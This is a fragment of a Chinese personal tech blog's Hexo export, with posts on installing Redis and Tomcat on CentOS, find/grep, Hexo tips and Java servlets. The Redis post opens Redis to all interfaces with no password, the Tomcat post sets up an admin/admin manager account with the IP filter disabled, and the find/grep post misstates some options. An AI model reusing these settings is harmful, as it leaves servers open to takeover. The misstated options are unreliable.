    <content><![CDATA[<h1 id="Redis6-2-6在Centos7上的安装过程"><a href="#Redis6-2-6在Centos7上的安装过程" class="headerlink" title="Redis6.2.6在Centos7上的安装过程"></a>Redis6.2.6在Centos7上的安装过程</h1><span id="more"></span>

<h1 id="1-系统环境"><a href="#1-系统环境" class="headerlink" title="1.系统环境"></a>1.系统环境</h1><p>操作系统：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@m161p114 software]# lsb_release -a</span><br><span class="line">LSB Version:    :core-4.1-amd64:core-4.1-noarch:cxx-4.1-amd64:cxx-4.1-noarch:desktop-4.1-amd64:desktop-4.1-noarch:languages-4.1-amd64:languages-4.1-noarch:printing-4.1-amd64:printing-4.1-noarch</span><br><span class="line">Distributor ID: CentOS</span><br><span class="line">Description:    CentOS Linux release 7.9.2009 (Core)</span><br><span class="line">Release:    7.9.2009</span><br><span class="line">Codename:   Core</span><br></pre></td></tr></table></figure>

<p>redis安装的源码文件：<br><a href="https://links.jianshu.com/go?to=https://download.redis.io/releases/redis-6.2.6.tar.gz">redis-6.2.6.tar.gz</a></p>
<p>该文件下载后，放置在 /opt/software目录</p>
<h1 id="2-gcc升级"><a href="#2-gcc升级" class="headerlink" title="2.gcc升级"></a>2.gcc升级</h1><p>redis6的源码需要用gcc版本为9的环境进行编译。首先需要确认，gcc及gcc-c++ 已经安装。如果没有安装，执行如下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install gcc gcc-c++</span><br></pre></td></tr></table></figure>

<p>当前系统的gcc环境为：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@m161p114 ~]# gcc -v</span><br><span class="line">Using built-in specs.</span><br><span class="line">COLLECT_GCC=gcc</span><br><span class="line">COLLECT_LTO_WRAPPER=/usr/libexec/gcc/x86_64-redhat-linux/4.8.5/lto-wrapper</span><br><span class="line">Target: x86_64-redhat-linux</span><br><span class="line">Configured with: ../configure --prefix=/usr --mandir=/usr/share/man --infodir=/usr/share/info --with-bugurl=http://bugzilla.redhat.com/bugzilla --enable-bootstrap --enable-shared --enable-threads=posix --enable-checking=release --with-system-zlib --enable-__cxa_atexit --disable-libunwind-exceptions --enable-gnu-unique-object --enable-linker-build-id --with-linker-hash-style=gnu --enable-languages=c,c++,objc,obj-c++,java,fortran,ada,go,lto --enable-plugin --enable-initfini-array --disable-libgcj --with-isl=/builddir/build/BUILD/gcc-4.8.5-20150702/obj-x86_64-redhat-linux/isl-install --with-cloog=/builddir/build/BUILD/gcc-4.8.5-20150702/obj-x86_64-redhat-linux/cloog-install --enable-gnu-indirect-function --with-tune=generic --with-arch_32=x86-64 --build=x86_64-redhat-linux</span><br><span class="line">Thread model: posix</span><br><span class="line">gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) </span><br></pre></td></tr></table></figure>

<p>通过如下命令升级：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install centos-release-scl</span><br><span class="line">yum -y install devtoolset-9-gcc devtoolset-9-gcc-c++ devtoolset-9-binutils</span><br><span class="line"></span><br><span class="line">scl enable devtoolset-9 bash</span><br></pre></td></tr></table></figure>

<p>配置环境变量：<br>vim /etc/profile<br>在末尾追加：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source /opt/rh/devtoolset-9/enable</span><br></pre></td></tr></table></figure>

<p>这样系统就能确保每次启动都能开启gcc9环境。</p>
<p>现在查看gcc版本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@m161p114 software]# gcc -v</span><br><span class="line">Using built-in specs.</span><br><span class="line">COLLECT_GCC=gcc</span><br><span class="line">COLLECT_LTO_WRAPPER=/opt/rh/devtoolset-9/root/usr/libexec/gcc/x86_64-redhat-linux/9/lto-wrapper</span><br><span class="line">Target: x86_64-redhat-linux</span><br><span class="line">Configured with: ../configure --enable-bootstrap --enable-languages=c,c++,fortran,lto --prefix=/opt/rh/devtoolset-9/root/usr --mandir=/opt/rh/devtoolset-9/root/usr/share/man --infodir=/opt/rh/devtoolset-9/root/usr/share/info --with-bugurl=http://bugzilla.redhat.com/bugzilla --enable-shared --enable-threads=posix --enable-checking=release --enable-multilib --with-system-zlib --enable-__cxa_atexit --disable-libunwind-exceptions --enable-gnu-unique-object --enable-linker-build-id --with-gcc-major-version-only --with-linker-hash-style=gnu --with-default-libstdcxx-abi=gcc4-compatible --enable-plugin --enable-initfini-array --with-isl=/builddir/build/BUILD/gcc-9.3.1-20200408/obj-x86_64-redhat-linux/isl-install --disable-libmpx --enable-gnu-indirect-function --with-tune=generic --with-arch_32=x86-64 --build=x86_64-redhat-linux</span><br><span class="line">Thread model: posix</span><br><span class="line">gcc version 9.3.1 20200408 (Red Hat 9.3.1-2) (GCC) </span><br></pre></td></tr></table></figure>

<h1 id="3-编译及安装redis"><a href="#3-编译及安装redis" class="headerlink" title="3.编译及安装redis"></a>3.编译及安装redis</h1><p>在/opt目录中执行解压：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zxvf /opt/software/redis-6.2.6.tar.gz </span><br></pre></td></tr></table></figure>

<p>然后执行make:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /opt/redis-6.2.6</span><br><span class="line">make</span><br><span class="line">make install PREFIX=/usr/local/redis</span><br></pre></td></tr></table></figure>

<p>配置redis环境变量，在/etc/profile中增加如下内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export REDIS_HOME=/usr/local/redis</span><br><span class="line">export PATH=$PATH:$REDIS_HOME/bin</span><br></pre></td></tr></table></figure>

<p>之后执行source加载环境变量：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>

<p>执行如下命令。说明环境变量配置成功：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@m161p114 utils]# redis-server --version</span><br><span class="line">Redis server v=6.2.6 sha=00000000:0 malloc=jemalloc-5.1.0 bits=64 build=336fe6a5b7d02b06</span><br></pre></td></tr></table></figure>

<h1 id="4-通过install-server-sh配置servie服务"><a href="#4-通过install-server-sh配置servie服务" class="headerlink" title="4.通过install_server.sh配置servie服务"></a>4.通过install_server.sh配置servie服务</h1><p>如果出现如下提示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@m161p114 utils]# ./install_server.sh </span><br><span class="line">Welcome to the redis service installer</span><br><span class="line">This script will help you easily set up a running redis server</span><br><span class="line"></span><br><span class="line">This systems seems to use systemd.</span><br><span class="line">Please take a look at the provided example service unit files in this directory, and adapt and install them. Sorry!</span><br></pre></td></tr></table></figure>

<p>需要用vim将install_server.sh中的如下代码注释掉:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$&#123;_pid_1_exe##*/&#125;</span>&quot;</span> = systemd ]</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="keyword">then</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">       <span class="built_in">echo</span> <span class="string">&quot;This systems seems to use systemd.&quot;</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">       <span class="built_in">echo</span> <span class="string">&quot;Please take a look at the provided example service unit files in this directory, and adapt and install them. Sorry!&quot;</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">       <span class="built_in">exit</span> 1</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="keyword">fi</span></span></span><br></pre></td></tr></table></figure>

<p>这是因为，centos7最开始的版本采用systemd配置服务。而新版本的centos又支持兼容之前的centos6中的配置。redis在此做了一个保护。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /opt/redis-6.2.6/utils</span><br><span class="line">[root@m161p114 utils]# ./install_server.sh</span><br><span class="line"></span><br><span class="line">Please select the redis port for this instance: [6379] </span><br><span class="line">Selecting default: 6379</span><br><span class="line">Please select the redis config file name [/etc/redis/6379.conf] </span><br><span class="line">Selected default - /etc/redis/6379.conf</span><br><span class="line">Please select the redis log file name [/var/log/redis_6379.log] /opt/redis/logs/redis_6379.log</span><br><span class="line">Please select the data directory for this instance [/var/lib/redis/6379] /opt/redis/data/6379</span><br><span class="line">Please select the redis executable path [/usr/local/redis/bin/redis-server] /usr/local/redis/bin/redis-server</span><br><span class="line">Selected config:</span><br><span class="line">Port           : 6379</span><br><span class="line">Config file    : /etc/redis/6379.conf</span><br><span class="line">Log file       : /opt/redis/logs/redis_6379.log</span><br><span class="line">Data dir       : /opt/redis/data/6379</span><br><span class="line">Executable     : /usr/local/redis/bin/redis-server</span><br><span class="line">Cli Executable : //usr/local/redis/bin/redis-cli</span><br><span class="line">Is this ok? Then press ENTER to go on or Ctrl-C to abort.</span><br><span class="line">Copied /tmp/6379.conf =&gt; /etc/init.d/redis_6379</span><br><span class="line">Installing service...</span><br><span class="line">Successfully added to chkconfig!</span><br><span class="line">Successfully added to runlevels 345!</span><br><span class="line">Starting Redis server...</span><br><span class="line">Installation successful!</span><br></pre></td></tr></table></figure>

<p>现在可以通过service进行启动和关闭：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@m161p114 utils]# service redis_6379 start</span><br><span class="line">Starting Redis server...</span><br><span class="line">[root@m161p114 utils]# service redis_6379 stop</span><br><span class="line">Stopping ...</span><br><span class="line">Redis stopped</span><br><span class="line">[root@m161p114 utils]# </span><br></pre></td></tr></table></figure>

<h1 id="5-修改配置文件"><a href="#5-修改配置文件" class="headerlink" title="5.修改配置文件"></a>5.修改配置文件</h1><p>修改redis的配置文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/redis/6379.conf</span><br><span class="line"></span><br><span class="line">修改bind为：</span><br><span class="line">bind 0.0.0.0  -::1</span><br></pre></td></tr></table></figure>

<p>这样外部服务才能连接到redis服务中。<br>启动redis,通过客户端连接测试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@m161p114 redis]# redis-cli</span><br><span class="line">127.0.0.1:6379&gt; </span><br><span class="line">[root@m161p114 redis]# redis-cli -h 192.168.161.114 -p 6379</span><br><span class="line">192.168.161.114:6379&gt; </span><br></pre></td></tr></table></figure>

<p>说明redis安装成功。</p>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>cmd修改编码为utf-8</title>
    <url>/2021/01/13/cmd%E4%BF%AE%E6%94%B9%E7%BC%96%E7%A0%81%E4%B8%BAutf-8/</url>
    <content><![CDATA[<h3 id="cmd修改编码为utf-8"><a href="#cmd修改编码为utf-8" class="headerlink" title="cmd修改编码为utf-8"></a>cmd修改编码为utf-8<span id="more"></span></h3><p>win+r输入regedit打开注册表</p>
<p>找到对应位置添加aotorun值为chcp 65001 这样每次打开cmd都会自动运行chcp 65001更改为utf-8</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/Image1111.png" alt="Image"></p>
]]></content>
      <categories>
        <category>小技巧</category>
      </categories>
      <tags>
        <tag>cmd</tag>
        <tag>编码</tag>
      </tags>
  </entry>
  <entry>
    <title>centos部署tomcat</title>
    <url>/2022/01/18/centos%E9%83%A8%E7%BD%B2tomcat/</url>
    <content><![CDATA[<p>查看系统的位数,通过该命令就能查看<span id="more"></span></p>
<p><code>getconf LONG_BIT</code></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220119161624050.png" alt="image-20220119161624050"></p>
<h4 id="安装JDK"><a href="#安装JDK" class="headerlink" title="安装JDK"></a>安装JDK</h4><p>下载jdk对应安装包linuxx64.tar.gz的</p>
<p>通过ssh工具上传到/usr/local下面</p>
<p>解压</p>
<p><code>tar -zxvf jdk-linux-x64.tar.gz </code></p>
<p>重命名,方便等会环境变量的配置</p>
<p><code>mv jdk1.8.0_131/ jdk1.8</code></p>
<h4 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h4><p><code>vim /etc/profile</code></p>
<h5 id="编辑profile文件"><a href="#编辑profile文件" class="headerlink" title="编辑profile文件"></a>编辑profile文件</h5><p>在文件末尾添加</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">export</span> <span class="string">JAVA_HOME=/usr/local/jdk1.8/</span></span><br><span class="line"></span><br><span class="line"><span class="attr">export</span> <span class="string">CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span></span><br><span class="line"></span><br><span class="line"><span class="attr">export</span> <span class="string">PATH=$PATH:$JAVA_HOME/bin</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="通过source命令重新加载profile文件"><a href="#通过source命令重新加载profile文件" class="headerlink" title="通过source命令重新加载profile文件"></a>通过source命令重新加载profile文件</h5><p><code>source /etc/profile</code></p>
<h5 id="检查是否安装成功"><a href="#检查是否安装成功" class="headerlink" title="检查是否安装成功"></a>检查是否安装成功</h5><p><code>java -version</code></p>
<p>出现如下显示,表示安装成功</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220119173528732.png" alt="image-20220119173528732"></p>
<h4 id="安装tomcat"><a href="#安装tomcat" class="headerlink" title="安装tomcat"></a>安装tomcat</h4><p>在usr/local目录下</p>
<p><code>mkdir myDir</code></p>
<p>进入myDir,上传tomcat包</p>
<p>解压</p>
<p><code>tar -zxvf apache-tomcat-9.0.56.tar.gz</code></p>
<p>重命名</p>
<p><code>mv apache-tomcat-9.0.56 tomcat9</code></p>
<p>开放端口,可以参考<a href="https://www.bluesatchel.space/2021/01/13/centos7%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE/">这里</a></p>
<p><code>firewall-cmd --zone=public --add-port=3306/tcp --permanent</code></p>
<p>重启防火墙,这点很重要!!!!</p>
<p>还要在对应云服务提供商的控制台去修改防火墙策略添加对应端口</p>
<p>修改./conf/server.xml配置站点</p>
<p>修改端口</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220119175609053.png" alt="image-20220119175609053"></p>
<p>进入tomcat/bin目录下启动tomcat服务</p>
<p><code>./startup.sh </code></p>
<p>但是出现了无法访问的情况</p>
<p>查看端口开放情况</p>
<p><code>netstat -tlun</code>,3306也是开放的</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220119180956606.png" alt="image-20220119180956606"></p>
<p>查看防火墙端口开放情况</p>
<p><code>/etc/firewalld/zones/public.xml</code></p>
<p>也是开放的</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220119181250440.png" alt="image-20220119181250440"></p>
<p>使用<code>lsof -i:3306</code>,查看3306占用情况,才发现自己忘记了Mysql在3306运行,把端口改成3333就行了,确实蠢驴一个呜呜呜</p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/tomcat_emoji.jpg" alt="tomcat_emoji" style="zoom: 33%;" />

<h5 id="访问管理页面managerApp"><a href="#访问管理页面managerApp" class="headerlink" title="访问管理页面managerApp"></a>访问管理页面managerApp</h5><p>根据提示,默认情况下管理页面只能允许同一台主机本地访问</p>
<p>配置conf/tomcat-users.xml</p>
<p>在tomcat-users下添加</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">&quot;manager-gui&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span> <span class="attr">password</span>=<span class="string">&quot;admin&quot;</span> <span class="attr">roles</span>=<span class="string">&quot;manager-gui&quot;</span> <span class="attr">username</span>=<span class="string">&quot;tomcat&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>打开**/webapps/manager/META-INF/目录下context.xml文件**</p>
<p>若不加Value元素默认不限制ip</p>
<p>若不加allow默认限制所有ip访问</p>
<p>这里为了方便,把value注释掉</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220119184223964.png" alt="image-20220119184223964"></p>
<p>现在访问管理页面,按照上面role的账号和密码输入就能访问了</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>centos</tag>
        <tag>tomcat部署</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow刷题-PHP特性</title>
    <url>/2022/01/28/ctfshow%E5%88%B7%E9%A2%98-PHP%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>find&amp;grep</title>
    <url>/2021/01/13/find&amp;grep/</url>
    <content><![CDATA[<h2 id="find-和-grep命令"><a href="#find-和-grep命令" class="headerlink" title="find 和 grep命令"></a>find 和 grep命令</h2><p>在使用linux时，经常需要进行文件查找。其中查找的命令主要有find和grep。两个命令是有区的。</p>
<p>　　区别：</p>
<ul>
<li><p>find命令是根据文件的属性进行查找，如文件名，文件大小，所有者，所属组，是否为空，访问时间，修改时间等。 </p>
</li>
<li><p>grep是根据文件的内容进行查找，会对文件的每一行按照给定的模式(patter)进行匹配查找。</p>
</li>
</ul>
<h3 id="find命令"><a href="#find命令" class="headerlink" title="find命令"></a>find命令</h3><h4 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h4><p>​                       find  path expression</p>
<h5 id="1-按照文件名查找"><a href="#1-按照文件名查找" class="headerlink" title="1.按照文件名查找"></a>1.按照文件名查找</h5><p>　　　　(1)find / -name httpd.conf　　#在根目录下查找文件httpd.conf，表示在整个硬盘查找</p>
<p>　　　　(2)find /etc -name httpd.conf　　#在/etc目录下文件httpd.conf</p>
<p>　　　　(3)find /etc -name ‘<em>srm</em>‘　　#使用通配符*(0或者任意多个)。表示在/etc目录下查找文件名中含有字符串‘srm’的文件</p>
<p>　　　　(4)find . -name ‘srm*’ 　　#表示当前目录下查找文件名开头是字符串‘srm’的文件</p>
<h5 id="2-按照文件特征查找"><a href="#2-按照文件特征查找" class="headerlink" title="2.按照文件特征查找"></a>2.按照文件特征查找</h5><p>　　　　(1)find / -amin -10 　　# 查找在系统中最后10分钟访问的文件(access time)</p>
<p>　　　　(2)find / -atime -2　　 # 查找在系统中最后48小时访问的文件</p>
<p>　　　　(3)find / -empty 　　# 查找在系统中为空的文件或者文件夹</p>
<p>　　　　(4)find / -group cat 　　# 查找在系统中属于 group为cat的文件</p>
<p>　　　　(5)find / -mmin -5 　　# 查找在系统中最后5分钟里修改过的文件(modify time)</p>
<p>　　　　(6)find / -mtime -1 　　#查找在系统中最后24小时里修改过的文件</p>
<p>　　　　(7)find / -user fred 　　#查找在系统中属于fred这个用户的文件</p>
<p>　　　　(8)find / -size +10000c　　#查找出大于10000000字节的文件(c:字节，w:双字，k:KB，M:MB，G:GB)</p>
<p>　　　　(9)find / -size -1000k 　　#查找出小于1000KB的文件</p>
<h5 id="3-使用混合查找方式查找文件"><a href="#3-使用混合查找方式查找文件" class="headerlink" title="3.使用混合查找方式查找文件"></a>3.使用混合查找方式查找文件</h5><p>　　　　参数有： ！，-and(-a)，-or(-o)。</p>
<p>　　 (1)find /tmp -size +10000c -and -mtime +2    #在/tmp目录下查找大于10000字节并在最后2分钟内修改的文件</p>
<p>  　   (2)find / -user fred -or -user george 　　#在/目录下查找用户是fred或者george的文件文件</p>
<p>  　   (3)find /tmp ! -user panda　　#在/tmp目录中查找所有不属于panda用户的文件</p>
<h3 id="grep命令"><a href="#grep命令" class="headerlink" title="grep命令"></a>grep命令</h3><p>　　　  基本格式：find  expression</p>
<h5 id="1-主要参数"><a href="#1-主要参数" class="headerlink" title="1.主要参数"></a>1.主要参数</h5><p>　　　　[options]主要参数：</p>
<p>　　　　－c：只输出匹配行的计数。</p>
<p>　　　　－i：不区分大小写</p>
<p>　　　　－h：查询多文件时不显示文件名。</p>
<p>　　　　－l：查询多文件时只输出包含匹配字符的文件名。</p>
<p>　　　　－n：显示匹配行及行号。</p>
<p>　　　　－s：不显示不存在或无匹配文本的错误信息。</p>
<p>　　　　－v：显示不包含匹配文本的所有行。</p>
<p>　　　　pattern正则表达式主要参数：</p>
<p>　　　　\： 忽略正则表达式中特殊字符的原有含义。</p>
<p>　　　　^：匹配正则表达式的开始行。</p>
<p>　　　　$: 匹配正则表达式的结束行。</p>
<p>　　　　&lt;：从匹配正则表达 式的行开始。</p>
<p>　　　　&gt;：到匹配正则表达式的行结束。</p>
<p>　　　　[ ]：单个字符，如[A]即A符合要求 。</p>
<p>　　　　[ - ]：范围，如[A-Z]，即A、B、C一直到Z都符合要求 。</p>
<p>　　　　.：所有的单个字符。</p>
<p>　　　　* ：有字符，长度可以为0。</p>
<h5 id="2-实例"><a href="#2-实例" class="headerlink" title="2.实例"></a>2.实例</h5><p>　　(1)grep ‘test’ d*　　#显示所有以d开头的文件中包含 test的行</p>
<p>　　(2)grep ‘test’ aa bb cc 　　 #显示在aa，bb，cc文件中包含test的行</p>
<p>　　(3)grep ‘[a-z]{5}’ aa 　　#显示所有包含每行字符串至少有5个连续小写字符的字符串的行</p>
<p>　　(4)grep magic /usr/src　　#显示/usr/src目录下的文件(不含子目录)包含magic的行</p>
<p>　　(5)grep -r magic /usr/src　　#显示/usr/src目录下的文件(包含子目录)包含magic的行</p>
<p>　　(6)grep -w pattern files ：只匹配整个单词，而不是字符串的一部分(如匹配’magic’，而不是’magical’)，</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>bash</tag>
        <tag>find</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo的一些使用技巧</title>
    <url>/2021/12/03/hexo%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h5 id="配置文章摘要显示"><a href="#配置文章摘要显示" class="headerlink" title="配置文章摘要显示"></a>配置文章摘要显示</h5><p>打开next配置文件</p>
<p>将该项设置为true</p>
<p><img src="/images/hexo%E8%AE%BE%E7%BD%AE%E6%96%87%E7%AB%A0%E6%98%BE%E7%A4%BA%E9%83%A8%E5%88%86%E5%86%85%E5%AE%B9/image-20211205134957202.png" alt="image-20211205134957202"></p>
<p>显示文章摘要有两种方法</p>
<p>1.在需要显示截断的地方添加<code>&lt;!--more--&gt;</code>标签</p>
<p>2.在<code>front-matter</code>中添加<code>description</code>,<code>description</code>中的内容就会添加到首页上面,并且它的优先级高于<code>&lt;!--more--&gt;</code>标签</p>
<h5 id="配置评论邮件提醒"><a href="#配置评论邮件提醒" class="headerlink" title="配置评论邮件提醒"></a>配置评论邮件提醒</h5><p><a href="https://blog.51cto.com/u_11378682/3661775">https://blog.51cto.com/u_11378682/3661775</a></p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>java_web</title>
    <url>/2022/01/11/java-web/</url>
    <content><![CDATA[<p>http1.0:客户端与web服务器连接后,只能获得一个web资源,断开连接</p>
<p>http2.0: 客户端与web服务器连接后,可以获得多个web资源</p>
<span id="more"></span>

<h5 id="Http响应"><a href="#Http响应" class="headerlink" title="Http响应"></a>Http响应</h5><p>响应状态码</p>
<p>200: 请求响应成功</p>
<p>3**: 请求重定向</p>
<p>4**: 找不到资源</p>
<p>5**: 服务器代码错误500 502(网关错误)</p>
<h5 id="MAVEN环境配置"><a href="#MAVEN环境配置" class="headerlink" title="MAVEN环境配置"></a>MAVEN环境配置</h5><p>M2_HOME   maven目录下的bin目录</p>
<p>MAVEN_HOME  maven目录</p>
<p>path中配置  %MAVEN_HOME%\bin</p>
<h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4><h5 id="Servlet简介"><a href="#Servlet简介" class="headerlink" title="Servlet简介"></a>Servlet简介</h5><p>要在web.xml中导包</p>
<ul>
<li>Servlet就是sun公司开发动态web的一门技术</li>
<li>Sun在这些API中提供一个接口叫做:Servlet,如果你想开发一个Servlet程序,只需要完成两个小步骤:<ul>
<li>编写一个类,实现Servlet接口</li>
<li>把开发好的java类部署到web服务器中</li>
</ul>
</li>
</ul>
<p>HelloServlet</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">helloServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        PrintWriter writer=resp.getWriter();<span class="comment">//响应流</span></span><br><span class="line">        writer.println(<span class="string">&quot;hello,Servlet&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>目录结构</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220113162720716.png" alt="image-20220113162720716"></p>
<h5 id="编写Servlet映射"><a href="#编写Servlet映射" class="headerlink" title="编写Servlet映射"></a>编写Servlet映射</h5><p>写的是java程序,但是要通过浏览器访问,而浏览器需要连接web服务器,所以我们需要在web服务中注册我们写的servlet,还需要给它一个浏览器能够访问的路径</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220113162502747.png" alt="image-20220113162502747"></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220113162617543.png" alt="image-20220113162617543"></p>
<p>请求/hello后,会在web.xml中找/hello对应的servlet-name  hello,然后再向上找hello对应的servlet-class</p>
<h5 id="servlet原理"><a href="#servlet原理" class="headerlink" title="servlet原理"></a>servlet原理</h5><p>本质上就是requset调用servlet中的service抽象类中我们自己实现的方法,再返回给servlet</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220113163642745.png" alt="image-20220113163642745"></p>
<h5 id="Mapping问题"><a href="#Mapping问题" class="headerlink" title="Mapping问题"></a>Mapping问题</h5><ul>
<li><p>一个servlet可以指定一个或者多个路径,(本质上都是请求同一个class)</p>
</li>
<li><p>一个servlet可以指定通用(默认)映射路径</p>
<ul>
<li>```xml<servlet-mapping>
    <servlet-name>hello</servlet-name>
    <url-pattern>/hello/*</url-pattern>  <!--请求hello/下的都会请求到hello-->
</servlet-mapping>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 默认请求路径(等于替代掉了index吧....)</span><br><span class="line"></span><br><span class="line">  - ```xml</span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">    	&lt;servlet-name&gt;hello&lt;/servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;  &lt;!--默认请求到hello--&gt;</span><br><span class="line">    &lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>可以自定义后缀实现请求映射(类似于正则)</p>
<ul>
<li>```xml<servlet-mapping>
    <servlet-name>hello</servlet-name>
    <url-pattern>*.abcd</url-pattern>  <!--只要请求后缀有abcd都会映射到hello-->
</servlet-mapping>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">#### ServletContext</span><br><span class="line"></span><br><span class="line">web容器在启动的时候,它会为每个web程序都创建一个对应的ServletContext对象,它代表了当前的web应用</span><br><span class="line"></span><br><span class="line">##### 共享数据</span><br><span class="line"></span><br><span class="line">很像android中页面传参的intent.putExtra和intent.getExtra</span><br><span class="line"></span><br><span class="line">- 在一个servlet中保存的数据,可以在另外一个servlet中拿到</span><br><span class="line"></span><br><span class="line">有一说一,java万物皆对象的思想确实牛逼,继承了直接就可以用父类方法,不同子类还能互动</span><br><span class="line"></span><br><span class="line">![image-20220113173732922](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220113173732922.png)</span><br><span class="line"></span><br><span class="line">![image-20220113173739121](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220113173739121.png)</span><br><span class="line"></span><br><span class="line">![image-20220113173749274](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220113173749274.png)</span><br><span class="line"></span><br><span class="line">![image-20220113173756430](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220113173756430.png)</span><br><span class="line"></span><br><span class="line">注意点:因为setAttribute写在了helloServlet中的doGet里面,所以要先请求一下/hello,再去请求/getname</span><br><span class="line"></span><br><span class="line">记得类型转换为String</span><br><span class="line"></span><br><span class="line">##### 获取初始化参数</span><br><span class="line"></span><br><span class="line">web.xml中</span><br><span class="line"></span><br><span class="line">```xml</span><br><span class="line">&lt;context-param&gt;</span><br><span class="line">    &lt;param-name&gt;url&lt;/param-name&gt;</span><br><span class="line">    &lt;param-value&gt;jdbc:mysql//localhost:3306/mybatis&lt;/param-value&gt;</span><br><span class="line">&lt;/context-param&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<p>java类里面</p>
